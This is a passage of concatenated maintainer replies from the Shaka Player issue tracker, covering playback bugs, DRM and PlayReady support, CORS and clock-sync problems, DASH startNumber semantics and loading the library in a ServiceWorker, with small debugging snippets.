current) had issues with non-zero start times, which also breaks all live content.  The GPAC clip in the demo app uses a non-zero start time, so you can reproduce with that.  The issue seems to be similar to one we had in #101 getting Firefox to work.  We'll have to change how/when we set currentTime during startup, but that can wait for another patch.\nI'll also need to add some PR DRM settings to the demo app.  There's one clip (\"multi-DRM\") that should work but doesn't yet.\n. Thanks, Jono.  Ping me when the next version is ready.\n. We've written our own Promise polyfill to more fully support IE11 after your pull request is merged.  Hope that helps.\n. @jonoward @jonoblinkbox\nAny idea when you'll be able to make revisions?  I'm hoping to wrap up v1.6.0 soon.\n. @jonoward Thanks for the revisions.  Looks good!  I'll run this PR through our build bot and then we can merge.\n. Woohoo!  IE support landed!  1,000,000 thanks to @jonoward!\n. @peyoh, can you provide us a sample of content that reproduces this situation for you?  If you can't share it publicly, please feel free to send me a private email.  That would really help us improve the resiliency of the system.  Thanks!\n. There is no event to catch.  Shaka v1 assumes that there will only be a single buffered range, and has assertions to this effect.  What you see are failed assertions.  In Shaka v2, we no longer make this assumption, so this message will go away.\nIf you wish, you can listen for the 'bufferingStart' event from the Player.  This event fires whenever the player enters a buffering state.  When this happens, you can check to see if there's a buffered range which starts ahead of the playhead (video.currentTime), and if so, seek to it.\n. Please consider this issue merged with #555.  If you are following this, please go to #555 and subscribe.  Future updates will appear there.. If you want to build from source, you will need Java to run the compiler.  Java is only required to compile the sources, but not to run them.\nIf you want to run an uncompiled version from github, you only need Python to run ./build/gendeps.sh.\nIf you want a pre-built binary, we supply those via npm and cdnjs.\n. Thanks for your suggestion.  We'll keep it in mind, and may reconsider in future if there is demand for it.\n. @jkarsrud We have been unable to reproduce on Windows 10 with Chrome beta (47).  We have QA giving it another try with Chrome stable (46).  Are you still seeing this issue?\n. Unable to reproduce with Chrome 46, either.\n. Since we can't reproduce, I'm removing this from the v1.6.0 milestone.\n. I have repro for this now.  Good news: it isn't platform-specific!\nHere's the simple repro.  Load the live sim into the demo app:  http://shaka-player-demo.appspot.com/?asset=http://vm2.dashif.org/livesim/testpic_2s/Manifest.mpd\nThen run:\napp.loadDashStream();\nsetTimeout(function() { video.currentTime = 0; }, 50);\nIt's a race, so it doesn't trigger 100% of the time, but I'm losing this race fairly often.  When we do, app.player_.videoSource_.liveEdgeOffset_ is extremely large, effectively collapsing the seek window.\nI believe we can fix this in v1.6.0.  Stay tuned.\n. Glad we could catch it!  It's never fun to mark \"unable to repro\".\n. @arikkrol1 Can you reproduce on master?  We believe this may have been caused by #184, which has been fixed.\n. @arikkrol1 Any updates on this?\n. If this is still an issue for you, please feel free to reopen.\n. The source map only maps compiled code back to the file and line number of the uncompiled code.  It does not unobfuscate variable, function, or member names.  This is a limitation of source maps and the compiler, and can't be addressed by the library.\nI strongly recommend debugging in uncompiled mode whenever possible.\n. Shaka supports multiple DRM providers by design, but that assumes a compliant EME implementation from the browser.  In practice, Playready won't be supported until we land a polyfill for IE's version of MediaKeys.  There is a pull request for that in review now.\n. We landed the new NetworkingEngine with this functionality in ab127e6.\n. No changes necessary right now.\n. Updated key status forEach argument order in b1141d5\n. This should be fixed in master, and the fix will be part of v1.6.0.  Please let us know if you have any further issues with this.\n. This is a great idea.  We'll be sure to add this to the design for v2.0.\n. Finished in 6231488.  All reported errors in v2.0 are shaka.util.Error type.  They have a category (network, media, drm, etc.) and a specific error code, both of which are numerical and fully-documented.\n. - I'm not sure we can know from JS that DRM is disabled.  At most, we could know that none of the application's requested key system configurations are available.  (Unavailable may mean disallowed by the user in the case of persistent licenses, but we won't know the difference.)\n- License expiration is easy and cross-browser.\n- What does it mean that a license \"can't be installed\"?  Malformed data or something otherwise rejected by the CDM?\n. That should be trivial and cross-platform.  The Promise returned by update() would be rejected in that case.\n. In an uncompiled build, you can set the log level at runtime using shaka.log.setLevel().\n. Hrm... based on my understanding of the Date header, it should always be the time at which the response is sent.  Am I mistaken?  It seems that the CDN is at fault on that.\nWhile we debate the validity of what the CDN is doing, unfortunately, you'll have to comment out the clock sync code to work around it.\n. My colleague has just pointed me to his comment on #191:\nDate gives the time when the content was created; not when it was transported (see https://tools.ietf.org/html/rfc7231#section-7.1.1.2).\nSo it looks like my Date-based sync may be fundamentally flawed.  We will need to decide internally what to do about it.  Sorry for the inconvenience.\n. The current plan is to abandon Date-based sync in v2.0.  Since some CDNs seem to behave differently on this, and since we don't have an alternative clock sync mechanism ready, we will leave the current behavior for v1.x.  Until v2.0 is ready, you may wish to customize your build of the library and remove Date-based sync.\n. Thanks, Mark.  In the short term (v1.6.0), we could return the track object from addExternalCaptions.  Would this work for now?\nLong term, I'd like to make sure that a future redesign of Shaka Player provides some more elegant way to represent the semantics you're looking for.  Can you help me understand the difference between captions and subtitles?\n. Thanks for the explanation.  We'll try to support that distinction better in v2.0.\nI've taken another look at the code, and it actually will be difficult to return TextTrack the way it is currently implemented.  Let me see if there is something else we can do short-term.\n. @sarge, Shaka v2 should now distinguish between caption and subtitle tracks.  Thanks for the report!\n. That doesn't sound too difficult.\nCan you help me understand the use case?  As a user watching content in various languages, why would I prefer audio in one language and text in another?\nAlso, this raises several behavior questions for me.  If my preferred audio isn't available, would I choose the 'main' language or an audio track that matches my text language?  If my preferred audio is available, and my preferred text is too, would I automatically enable text?  etc.\n. Ah, I see.  Okay, let me spend a little time deciding how to define the behavior, and I'll post details here before we implement.\n. The new language preferences for audio and text will be used independently to select audio and text streams.\nIf the user's preferred audio isn't available, the will hear whatever is tagged as the 'main' language.  Text will be automatically shown if the preferred text language is available and it does not match the preferred audio language.\nFor applications that want the old behavior, both language settings can be set to the same value.\nThis will be available in the v2 beta.\n. If the application creates multiple Player instance, I see no reason the application couldn't just track them.  The application is already responsible for managing a Player's lifetime and calling unload() or destroy() on it, so even a one-Player app should maintain a reference to the Player.  A multi-Player application should do the same, in my opinion.\nIf you disagree with this, please feel free to reopen and we can discuss further.\n. Sorry, that's not supported today.  Can you not ask the owner of the application to simply supply a Player instance to the plugin?  Or shim shaka.player.Player?  For example:\n(function() {\n  console.assert(shaka.player.Player, 'load Shaka first!');\n  var originalPlayer = shaka.player.Player;\n  shaka.player.Player = function(video) {\n    var player = new originalPlayer(video);\n    // do something with player.\n    return player;\n  }\n})();\n. The EME spec will require HTTPS in the future, so the demo app was changed to be ready for that change.\nIf you need to test content locally over HTTP, you should be able to run Shaka Player from localhost over HTTP as well.  Let me know if you have any difficulties with this, and I'll be happy to help.\n. We have had more complaints about this, and we have changed our appspot config to permit plain HTTP again.\n. In your DRM callback, you need to set the 'withCredentials' flag to true and set a license request pre-processor callback.  In the pre-processor callback, set the request header 'Authorization' to the value of 'Basic ' + btoa('username:password').\nI hope that helps.  If not, please reopen and we can discuss further.  Alternately, you can direct questions like this to the mailing list as well.\nReferences:\nhttp://stackoverflow.com/questions/1652178/basic-authentication-with-xmlhttprequest\nhttps://shaka-player-demo.appspot.com/docs/tutorial-player.html (section \"Protected Content\")\nhttps://shaka-player-demo.appspot.com/docs/tutorial-network.html\n. Sorry for the delay in my reply.  That's correct, there are no events for this at the moment.\nAny change in enabled text tracks either driven through your app, in which case you already know, or it's done through the built-in controls in the browser, in which case there is no native event and we would have to poll to discover this for you.\nI don't think polling HTMLTrackElement.mode is something I want to do right now.  Do you have any ideas for other ways we could solve this?\n. Since there's no better options on the table other than polling, I'm going to close this.  The same polling could be done at the app level if desired.\n. Sorry, I can reproduce with the browser's built-in controls.  I missed that part of the report initially.\n. How would the client do such a thing?  If the video element throws a decode error and the MSE implementation invalidates all the source buffers, it would seem there's not much a JS app can do.\n. Is this something Firefox's MSE implementation can recover from?\n. @wolenetz Thanks, makes sense.  This matches with my experience in testing and debugging, as well.\n@nickdesaulniers So I'm not seeing any reasonable way for a player to recover from a fatal error in the media.  Besides, if the content is fundamentally broken, shouldn't that be a bug on the software creating the content?  Have you reported the bug to gpac?\n. If only part of the file was transferred, the request failed and we don't append.\n. Let's not get off-topic.  To wrap up on side-tracks:\n1) Shaka doesn't use appendStream() and has no plans to do so in the forseeable future.\n2) If the content is bad (which I think we agree on), follow up with gpac on the issue you filed there.\n3) If you take issue with how Chrome handles content it can't decode, please file at crbug.com.\nAnd to close the main topic:\nAt the moment, it appears that content that can't be decoded is a fatal error from the browser's point of view, so Shaka Player can't reasonably do anything about it.  In any case, we do not, as a matter of policy, go out of our way to \"fix\" bad content in the first place.\n. Hrm, tricky situation.  If there's no SourceBuffer constructor exposed, it seems like you will not be able to write a polyfill for it.\nWhat browser are you trying to support?\n. Okay.  Let me know how it works out, and then we can discuss the possibility of merging.\n. Hi @hackerdude, any news on a polyfill?  If you are still working on this, I will leave the issue open for you.\n. Shaka's position has always been to support current web standards, and to use polyfills where necessary to compensate for certain platform variations.  It sounds like Opera TV is not up-to-date on MediaSource, but Shaka team has neither the time nor the hardware to work on a polyfill for this.\nSince @hackerdude has not responded in three weeks, I'm going to close this as \"will not implement\".  If anyone wants to develop the polyfill and send us a PR, I would be happy to review it.  Just let us know you're working on it so I can re-open this issue.  Thanks!\n. Good catch!  And thanks for the PR to fix it.\n. @sanbornhnewyyz I have the manifest, but I'm unable to access the actual segments, and I don't think I can reproduce without them.  Can you send me enough data to reproduce?\n. Never mind, I think I can do this without the content, actually.\nJust looking at the output of the manifest parser/processor, I see that every StreamInfo has the same key ID, \"41133709B21548B794EB000A2BF8A817\", which matches what's in the manifest's default_KID.  So the default_KID seems to have nothing to do with it.\nI do, however, see some StreamInfos which are disabled:\napp.player_.videoSource_.manifestInfo.periodInfos[0].streamSetInfos[2].streamInfos.map(function(s) { return JSON.stringify({allowed: s.allowedByKeySystem, id: s.id, width: s.width, height: s.height}); });\n[\n  {\"allowed\":true,\"id\":\"video=77000\",\"width\":256,\"height\":144},\n  {\"allowed\":true,\"id\":\"video=137000\",\"width\":288,\"height\":160},\n  {\"allowed\":false,\"id\":\"video=217000\",\"width\":320,\"height\":176},\n{\"allowed\":false,\"id\":\"video=317000\",\"width\":360,\"height\":208},\n  {\"allowed\":true,\"id\":\"video=505000\",\"width\":640,\"height\":360},\n  {\"allowed\":true,\"id\":\"video=705000\",\"width\":640,\"height\":360},\n  {\"allowed\":true,\"id\":\"video=1194000\",\"width\":848,\"height\":480},\n  {\"allowed\":true,\"id\":\"video=1790000\",\"width\":1280,\"height\":720},\n  {\"allowed\":true,\"id\":\"video=2190000\",\"width\":1280,\"height\":720},\n  {\"allowed\":true,\"id\":\"video=2590000\",\"width\":1280,\"height\":720}\n]\nIf I fake a key status event:\nshaka.log.setLevel(shaka.log.Level.V1);\napp.player_.videoSource_.onKeyStatusesChange({'41133709B21548B794EB000A2BF8A817': 'usable'});\nI get these logs:\nPermitting stream video=217000. \nPermitting stream video=317000.\nAnd now everything seems to be enabled:\n[\n  {\"allowed\":true,\"id\":\"video=77000\",\"width\":256,\"height\":144},\n  {\"allowed\":true,\"id\":\"video=137000\",\"width\":288,\"height\":160},\n  {\"allowed\":true,\"id\":\"video=217000\",\"width\":320,\"height\":176},\n{\"allowed\":true,\"id\":\"video=317000\",\"width\":360,\"height\":208},\n  {\"allowed\":true,\"id\":\"video=505000\",\"width\":640,\"height\":360},\n  {\"allowed\":true,\"id\":\"video=705000\",\"width\":640,\"height\":360},\n  {\"allowed\":true,\"id\":\"video=1194000\",\"width\":848,\"height\":480},\n  {\"allowed\":true,\"id\":\"video=1790000\",\"width\":1280,\"height\":720},\n  {\"allowed\":true,\"id\":\"video=2190000\",\"width\":1280,\"height\":720},\n  {\"allowed\":true,\"id\":\"video=2590000\",\"width\":1280,\"height\":720}\"\n]\nThe only way I can see that my test scenario here is unrealistic is that I'm faking the keystatuses event.  If the actual key status event had a different key ID, that would definitely explain the behavior you're reporting.  However, that would also imply that your manifest has a different key ID than your license.\nPerhaps the manifest is wrong?  Or perhaps there's an issue with your license server that is causing it to return a different key ID than expected?\nIn any case, the actual logic to enable streams by key ID appears to be working correctly.  I'll mark this as 'unable to reproduce' for now, but leave it open until you have a chance to get back to us.\n. @sanbornhnewyyz Were you able to find a bug on your end?\n. TL;DR: @ddorwin is probably right.\nThis is how end-of-stream works in Shaka:\nWhen a Stream appends the final segment for its content type (audio or video), it fires an internal, non-bubbling 'streamEnded' event.  This goes to the StreamVideoSource, which owns the MediaSource object.\nWhen all Stream objects have reported 'streamEnded', then final segments have been appended for all types, and StreamVideoSource calls MediaSource.endOfStream().  This tells the browser's video stack that we will not be providing any additional segments.\nWhen MediaSource.endOfStream() has been called AND video.currentTime hits the end of the timeline, then the video element is supposed to fire the 'ended' event.  (If we didn't call endOfStream(), the video would simply pause at the end, waiting for more data to extend the video timeline.)\nSo if 'ended' isn't fired on the video, it's very likely a browser bug, and it seems @ddorwin knows a likely candidate.\nYou could patch Shaka to work around the Chrome bug by emitting its own event when MediaSource.endOfStream() and Math.abs(video.currentTime - video.duration) < someTinyThreshold.  This, however, would not be something we would accept as a patch.  We try not to hide browser bugs if we can help it, in particular when the impact is this small.\n. Thanks @ddorwin for pointing us at the Chrome bug, and thanks @sanbornhnewyyz for offering to contribute to that report.  Since it appears this isn't a Shaka bug, I'm going to go ahead and close this issue.\n. Hi Leandro,\nIt sounds like you have two separate issues:\n1) documentation is confusing\n2) buffering events are unreliable\nIs this accurate?\n. @leandromoreira Glad to hear it!\nDid you retest and determine if buffering events are reliable?  We have automated test cases for these, but if we missed something, we'd love to know.\n. Okay, since we've determined that the buffering event is working correctly, it's just an issue of documentation.\nWe already have all events documented in one place.\nIf you look at the docs, in the bottom of the right-hand side you'll see a list of all events.  If you set the documentation view to in the top-left corner to 'Show: exported' (which is the default), then the list is only those publicly exported events you can listen for on the Player object.\nIf you click on a particular event, such as BufferingEvent, you'll see the type property with the value 'bufferingStart' or 'bufferingEnd'.\nDoes that help?\n. Excellent.  Sorry for all the confusion, and thanks for using Shaka Player!\n. I don't think it's about 4k content running us out of memory.  I get the same results if I disable adaptation and run video at 426x182.\nI checked, and appendBuffer() is neither throwing an exception, causing an 'error' event to fire, nor actually appending the audio buffers.  It would seem IE11 is not doing the right thing here.  If it can't accept the content, some kind of error would be appropriate.\nI don't see anything I can do about it other than change the test content.  It's unfortunate that we will not be able to rely on IE's MSE implementation to behave in a way that is consistent with other browsers.\n. I'm going to leave this open until next week.  If anyone has any ideas, I'd be happy to hear them.\n. Moving to 2.0 and renaming.  Not sure why IE11 won't decode our assets, but it's out of our hands.  What we will have to do is find test assets that IE11 will decode.\n. Thank, Jono!  I can certainly add the URL to the repo.  We don't need to mirror the asset itself.\n. Hrm... I'm having the same problem with that asset.  IE11, for me at least, ignores all the audio segments past t=9 for some reason.\n. I've got IE 11.0.9600.18053 (update version 11.0.24) Windows 8.1 Enterprise, inside VMWare hosted on Ubuntu Linux.\n. We will have a new set of test assets in v2.0, and IE11/Edge testing will now be done on real hardware.  (I still can't understand why the browser would behave so differently on a VM.)\n. A new set of demo/test assets from a variety of sources has been added for v2.  Cross-browser compatibility has not yet been vetted.  Ultimately, all test assets will be included in automated testing across all supported browsers.\n. Unfortunately, XMLHttpRequest doesn't give us any way to know that our manifest request was redirected.  This means that relative URLs will still be relative to the original location.\nThe Fetch API would allow us to know that a redirect has happened, and to where.  However, Fetch is only available on Chrome, Firefox, and Opera.  IE and Safari don't have it yet.\nIf we were to start using Fetch and polyfill it with XHR, the result would be redirects that behave differently on different browsers.  I believe that would only cause more confusion for application developers.\n. This issue was closed 10 months ago.  We currently support the location attribute in the manifest as well as HTTP redirects.\n. Hi @baconz,\nThanks for the PR.  We actually ran into this same issue ourselves, in which two DrmInfos had two different bound versions of the same callback.  We had a change in review internally that fixed this in a different way, and it was just approved and released.  Please see 6263e1f and #227.\n. Fixed in 6263e1f.\n. We will offer plugins for networking in 2.0.  You will be able to implement any URI scheme you like any way you want.  We'll be publishing details soon.\n. We landed the new NetworkingEngine with this functionality in ab127e6.\n. Hi @baconz,\nThis is definitely something we should support.  Thanks for the pull request.\nThis may also have helped us identify the cause of #185, which we had not been able to reproduce previously.\nWe need one thing from you before we can accept this PR.  Please read CONTRIBUTING.md for instructions on signing the contributor license agreement and adding yourself to AUTHORS and CONTRIBUTORS.\n. Thanks, Seth.  Just ping me here when the CLA is done.\n. I don't see Philo on our list of corporate CLA signers yet.  I'll do some digging internally and see if there is perhaps some kind of queue where new corp CLAs have to be approved by a human.\n. Turns out I was simply not patient enough.  I see your CLA now.  Thanks for the contribution!\n. Yes, this is a tricky area.\nFrom a user's perspective, I can see that buffering and pausing are separate concepts.  When my connection is insufficient and I see a video buffering, I sometimes want to pause, wait for data to buffer to my satisfaction, then unpause, assuming I am sufficiently motivated and want to try to work around the bad connection.\nBut in a DASH scenario, this only makes sense if my bandwidth is below the bandwidth requirements for the lowest-resolution stream.  Otherwise, pausing to force extra buffering would be unnecessary.\nWe made the decision a long time back not to duplicate functionality of the video element, such as seeking, play/pause, etc.  Given that, there are two ways I see that we could choose to implement a buffering state: one is via pause(), and the other is via playbackRate=0.\nUsing pause(), as we do now, means we can't layer a pause() on top of buffering state.  Using playbackRate=0 may be somewhat better, but is complicated by the design of Shaka 1.\nCurrently, playbackRate=0 is used by StreamVideoSource to inhibit playback during stream startup.  Meanwhile, buffering state is controlled by Player without knowledge of what StreamVideoSource is doing.  Using playbackRate for buffering conflicts with this, and I'm not sure how to resolve this cleanly within the existing design.\nI see this as a design bug in Shaka 1.  In Shaka 2, buffering and stream startup will both be controlled by one class called StreamingEngine.  (Startup is really a special case of buffering anyway.)  Player will no longer be responsible for buffering state at all.  That should give us the freedom to implement buffering using playbackRate, which should allow us to play and pause independent of buffering state.\nHigh-level design docs for Shaka 2 were recently announced on the mailing list if you're interested in the broad strokes.  We hope to publish a preview of our progress on Shaka 2 to github by the end of the month.\n. I just verified that this is no longer an issue with the latest code from the master branch.  You should see the new behavior in v2 beta.\n. Hi @mephillips423,\nI don't believe the player can do anything to influence this.  Frame-accurate seeking depends on the browser and the video encoding.\nFor example, if every frame were a key frame, then I have no doubt every frame would be directly seekable in every MSE-capable browser.  This would be a terrible idea, though, since it would ruin compression and therefore quality.\nSeeking to non-keyframes is something a browser would have to support by seeking first to the previous keyframe, then decoding subsequent non-keyframes until the target frame has been decoded.  It is entirely possible that browsers may choose to avoid this when the video is paused.  I don't know for sure.\nI would bet that the reason you get frames displayed every 20-40 frames is that your content's keyframe interval is between 20 and 40.\nYour application seeks directly on the video element by setting currentTime.  The only time the player gets involved when you seek is if this time has not been buffered yet.  In that case, we would have to fetch the appropriate segments and feed them to the browser.\nI would suggest that you make sure the range in which you want to frame-accurately seek is actually buffered.  html5VidElem.buffered is where you would get this information.\nIf the content is buffered, and seeking while paused still does not display frames, then it is a browser implementation issue.  In this case, I would advise you to file a feature request with your browser vendor to support frame-by-frame display while paused.\nI just did a quick check with the \"car\" video from our demo app, and Chrome does allow seeking while paused with video.currentTime += 1/23.97.  It appears to do interesting things with b-frames or maybe with PTS/DTS differences, but that is another matter.\n. I tested in Chrome 47 on ChromeOS, with the \"car\" video from our demo app, and it does allow seeking while paused.  Perhaps there is a per-platform difference, or a difference with the content.  Could you test with the same content I am using?  That would eliminate one of the differences.\nhttp://shaka-player-demo.appspot.com/assets/car_cenc-20120827-manifest.mpd\n. I'm sorry, we are not affiliated with Wowza.  If you need help with your Wowza stream server, you should contact Wowza support.\nSince we've determined that your use-case works in Shaka Player running on Chrome, I'm going to close this issue now.  Thanks for using Shaka, and please feel free to open a new issue if you have any Shaka-related problems.\n. Have you tried Wowza?  http://www.wowza.com/forums/forum.php\n. @Feenposhleen, we will endeavor to remove cache-busting parameters in Shaka 2, but we do not have a solution yet.  The problem was discussed already in #76.  In particular see my comments from May 21.  If you have any ideas on how to solve the problem described there, please let me know.\nIn the mean time, we added a feature in v1.4 which will allow you to override this in your application.  If you provide a bandwidth estimator and assert that caching will not affect your bandwidth estimations by returning true from supportsCaching().\nSo this is WAI for v1.x, but I would be happy to have your input on ways to solve BW estimation w/ caching in v2.\n. Then this is related to #205.  Date-based sync only works when the response is not cached.  As it turns out, though, Date-based sync sometimes still fails, depending on the CDN.  We plan to abandon Date-based sync in v2.0, but since this seems to differ CDN-to-CDN, we will leave the current behavior for v1.x.\nIt is difficult to balance caching, bandwidth estimation, clock sync, and CDN-specific behaviors.  We are trying to simplify all of this in v2.0 and finally make Shaka cache-friendly.\nUntil v2.0 is ready, you may wish to customize your build of the library and remove cache-busting entirely.  This may have consequences for bandwidth estimation and clock sync, so proceed with caution.\n. @edouardbe: JFYI\n. By popular demand, we're going to offer a configure parameter to disable cache-busting completely in v1.6.2.  It should be up on github soon.  Please note the trade-offs and issues related to bandwidth estimation before using.\n. @edouardbe You misunderstand.  We did not explicitly move the parameter in any version.  In Shaka v1.6.2, there is now an option to allow you to remove the _=date parameter (the cache-buster) entirely.\n. Thanks, Mark.  We made a mistake there for sure.\nMy first thought was that we should have exported the static methods, but that doesn't seem to work without exporting the constructor as well.  Instead, it looks like we will have to assign the static methods in the polyfill's installer.\nShouldn't take long to publish a fix, which we will roll into v1.6.1.\n. Please do send me the manifests privately.  If the content can also be made available, that is often helpful for debugging.\nThe names of the encoder vendors would also be helpful.  There are many parts of the DASH spec in need of clarification, and some vendors have mutually incompatible interpretations of certain things.\n. We believe that using startNumber as an offset in the way described above is not in keeping with the intent of the spec.\nThe first segment in a Period is segment number 1.  The segment number is used to fill in $Number$ in templates.\nThe startNumber attribute tells us the number of the first segment in the manifest.  For example, look at live streams with SegmentList.  The list does not necessarily show all segments that have been broadcast, so startNumber lets you know what is there:\n```\n Just started broadcasting \n\n001.mp4 calculated start time 0 \n002.mp4 calculated start time 10 \n003.mp4 calculated start time 20 \n\n A little later \n\n005.mp4 calculated start time 40 \n006.mp4 calculated start time 50 \n007.mp4 calculated start time 60 \n\n```\nThe only way startNumber is consistent across live SegmentList, SegmentTemplate+SegmentTimeline, and SegmentTemplate+duration is if these are the equivalents for the two above examples:\n```\n Just started broadcasting \n\n\n start time 0, calculated URL 001.mp4 \n start time 10, calculated URL 002.mp4 \n start time 20, calculated URL 003.mp4 \n\n\n A little later \n\n\n start time 40, calculated URL 005.mp4 \n start time 50, calculated URL 006.mp4 \n start time 60, calculated URL 007.mp4 \n\n\n```\nAnd for duration:\n<!-- All segment information is known, no matter when we started broadcasting -->\n<SegmentTemplate duration=10 media=\"$Number%03d$.mp4\" />\n<!-- Segment 1, calculated URL 001.mp4, calculated start time 0 -->\n<!-- Segment 2, calculated URL 002.mp4, calculated start time 10 -->\n<!-- Segment 3, calculated URL 003.mp4, calculated start time 20 -->\n<!-- Segment 4, calculated URL 004.mp4, calculated start time 30 -->\n<!-- Segment 5, calculated URL 005.mp4, calculated start time 40 -->\n<!-- Segment 6, calculated URL 006.mp4, calculated start time 50 -->\n<!-- Segment 7, calculated URL 007.mp4, calculated start time 60 -->\nIf startNumber influences $Number$ for SegmentTemplate+duration, we end up with different URLs for the same segments as described by the above SegmentTimeline and SegmentList.  So in order for startNumber to be consistent in all three cases, startNumber can't have any impact on the URLs for SegmentTemplate+duration.\nThis is just one area in the DASH spec where the language needs to be clarified and concrete examples need to be given.  As it stands, there is enough ambiguity and confusion that not all implementations are compatible with regard to startNumber.  We believe the interpretation above is the only one that makes the spec self-consistent.\n. @tobbee Thanks for the information.  I stand corrected.\nCan you clarify a few points for us?  Some things are still unclear to me.\nIf startNumber refers to the segment that is available one segmentDuration after the period start (at the period start, only the init segments are available), does that mean that the live SegmentList examples I gave are not spec-compliant?  We've seen dynamic manifests like this, in which SegmentList shows the most recent handful of segments, and uses startNumber to indicate the number of the first segment in the list, rather than the first segment in the Period.\nWhat about the SegmentTimeline examples above?  Is it valid for SegmentTimeline to update in a dynamic manifest?  Is it valid for startNumber to indicate the number of the first segment in the timeline, rather than the first segment in the Period?\n. Okay, so for now, we will change SegmentTemplate w/ duration to treat startNumber specially compared to SegmentList and SegmentTimeline.\n. @tobbee @Feenposhleen Please take a look and reopen if you have any further issues.  The fix will be in release v1.6.2.\n. @priyajeet, this most recent fix supercedes earlier changes such as that for 232.  If you have find any bugs in the latest code on master, please let us know.\n. Thanks, Edouard.  This appears to be a duplicate of #235.  Please see the discussion there.\n. @cpeterso Thanks, Chris!\n. Hi @pajong.\nWhat version of Shaka Player are you using?  PlayReady & IE11 support were added in v1.6.0, and only through polyfills.\nAre you using shaka.polyfill.installAll()?  Do you see log messages in an uncompiled build like 'Using EME v20140218' or 'EME not available'?\nWhat version of Windows are you using?  If I remember correctly, IE11 only supports MediaSource in Windows 8+, and only supports EME in Windows 8.1+.\n. Sounds like a duplicate of #185, which was fixed in v1.6.0.  What version of Shaka Player are you using?\n. The CORS situation for 1.6 hasn't changed, and we have never placed any restrictions on http vs https at the library level.  Browsers may or may not restrict these things, and URI scheme definitely affects a browser's CORS checks.\nCORS-wise, you want Access-Control-Allow-Origin: * or Access-Control-Allow-Origin: scheme://my.origin.tld.  To use the existing clock-sync mechanism, you also have to allow access to the Date header with Access-Control-Expose-Headers: Date.  (This clock-sync mechanism will not be used in Shaka 2.)\n. @randeeppr Were you able to get CORS working with v1.6?\n. @randeeppr \nI was about to post my own results, until I realized that your URL is a fake one.  :-)\nCan you please try this and report back?\ncurl -I http://live.domain.com/dash/russiatoday/audio1/Header.m4s?123456\nI am curious if the cache-buster is causing your CORS issues.\n. Well, then it's not related to cache-busting.  I don't see any obvious problem with the Access-Control headers here.\nAre you using cookies and/or the withCredentials flag in the request?  If you were sending cross-origin credentials, you would need Access-Control-Allow-Credentials: true.\nI can't think of any other reason for CORS to fail.  If you can send me the real manifest URL privately, I could help you debug.  Otherwise, I'm stumped.\n. joeyparrish@google.com\n. Here's what I'm getting:\n\nXMLHttpRequest cannot load http://domain.com/path/to/video1/138697.m4s. No 'Access-Control-Allow-Origin' header is present on the requested resource ... The response had HTTP status code 404.\n\nThe 404 is the key.  There is no CORS problem, it just appears so since your 404 responses don't have the CORS headers on them.\nIt appears that clock sync is the root of the problem.  We don't support the UTCTiming element you're using in your manifest, but instead use the Date header from the manifest request.  Your server's Date is ahead of my workstation's date by 104 seconds, and ahead of the UTCTiming element by 127 seconds.\nSo the player is requesting segments that are not yet available, which results in a 404 error.\n. Thanks, Scott.  @MegaLabs1, that's all correct.  Each browser supports a different DRM system, and to date, no mainstream browser supports more than one.  Microsoft's browsers contain Microsoft's DRM system (PlayReady), and Google's browsers contain Google's DRM system (Widevine).\nShaka is agnostic to all of this, and simply queries the browser for the systems requested by the application.  Shaka can be configured to use multiple DRM systems for the same piece of content, and it will select whichever is available on that browser.\nThere's nothing stopping browsers from supporting more than one DRM system, and if/when that happens, Shaka will still be able to generically query DRM support through the browser's EME API.\n. The preload attribute on video has no effect on MediaSource playbacks such as those driven by Shaka.  It is only used for progressive playback using video.src='blah.mp4', not with adaptive streaming such as DASH.\n. I also tried adding preload=\"none\" to the video tag in our demo app, and confirmed that there is no difference in behavior.\nIf you want to control how much data is buffered by Shaka, we have player.configure({'streamBufferSize': ...}) for this.\n. We have not done any work with ServiceWorkers, but I have some guesses about what might cause such a problem. Let me explain a few things about how Closure works in uncompiled mode.\nYou have to load 'third_party/closure/goog/base.js' before you can goog.require anything.  goog.require (as used in shaka-player.uncompiled.js and elsewhere) is implemented in goog/base.js.  It loads scripts by adding a script tag to the document (through goog.writeScripts_, goog.importScript_, and goog.writeScriptTag_).\nThe first script it loads is the dependency map (third_party/closure/goog/deps.js) which is created by build/gendeps.sh or build/all.sh.  If that deps map does not exist, goog.require will be unable to locate the required class.  So first, just check to make sure you have the deps map, and if not, run build/gendeps.sh.\nThe other thing that might cause you problems is if goog.writeScriptTag_ can't function inside a ServiceWorker.  It calls document.write(''), which I expect is not doable from a ServiceWorker.  If this is the problem, you can tell the closure loader to use a different method by setting the global variable CLOSURE_IMPORT_SCRIPT to a function that takes a path name and returns true if it succeeds.  This could probably be mapped to importScripts.  For example:\n```\n// Must be defined on the same global object used by goog/base.js, so don't use var:\nthis.CLOSURE_IMPORT_SCRIPT = function(path) {\n  importScripts(path);\n  return true;\n};\nimportScripts('third_party/closure/goog/base.js', 'shaka-player.uncompiled.js');\n```\nLet me know if any of these things is helpful.\n. Can you provide details on the DOMException so that we can better document the failure here?  Perhaps that might be of use to someone who wants to tackle this issue in future.\n. Ah, I see.  goog.findBasePath_ also accesses document to locate base.js and construct deps.js relative to that.\nTry this:\nthis.CLOSURE_BASE_PATH = '/third_party/closure/goog/';\nthis.CLOSURE_IMPORT_SCRIPT = function(path) {\n  importScripts(path);\n  return true;\n};\nimportScripts('third_party/closure/goog/base.js', 'shaka-player.uncompiled.js');\n. That could be.  I don't have any experience with ServiceWorkers, and we have never made it an explicit goal to run Shaka in a ServiceWorker.  I can't say if this is even feasible.\n. @pajong I would be happy to help you figure this out.  Please provide console logs of a failed playback and the contents of your interpretContentProtection callback (you can omit the specific key, obviously).\n. I am able to reproduce your issue on my own assets by either providing the wrong key or the wrong key ID.  Please double-check that your key and key ID are correct for the content.\n. There's not enough information in that manifest for the demo app to generically configure DRM.  All it has is this in the video AdaptationSet:\n<ContentProtection schemeIdUri=\"urn:mpeg:dash:mp4protection:2011\"\n    value=\"cenc\"\n    cenc:default_KID=\"20000000-2000-2000-2000-200000000002\"/>\nHow do we know that we should use clearkey over any other DRM system?  Or what the key should be for clearkey?\nAt the application level, your app could provide this information to the library, but the demo app itself can't know these things out of the box.\nThe reason the audio plays is that it is not encrypted.  The library knows that the video is encrypted, but the video AdaptationSet can't be used because the DRM info has not been provided.  The library filters out unusable AdaptationSets, which is why you get audio-only playback.\nI googled the URL you gave me to find the keys.  I found them here: https://github.com/Dash-Industry-Forum/dash.js/commit/2ad046a\nHere's a working interpretContentProtection callback for this content:\n```\nfunction interpretContentProtection(schemeIdUri, contentProtection) {\n  var Uint8ArrayUtils = shaka.util.Uint8ArrayUtils;\nif (schemeIdUri == 